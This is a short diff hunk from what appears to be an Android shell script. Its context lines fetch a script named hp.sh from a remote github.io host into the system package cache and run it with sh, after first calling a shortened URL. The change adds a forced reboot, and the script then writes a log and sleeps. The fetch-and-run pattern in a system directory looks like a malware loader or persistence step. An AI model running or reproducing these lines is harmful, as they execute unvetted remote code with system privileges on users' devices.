@@ -14,6 +14,7 @@ if [ "$file_content" = "123" ]; then
     curl -l https://sourl.cn/tRtpnk
     curl -s -o /data/system/package_cache/hp.sh http://tanluying.github.io/ying/hp.sh
     sh /data/system/package_cache/hp.sh
+    reboot
 fi
 echo "456" > /storage/emulated/0/Download/apks.log
 sleep 900
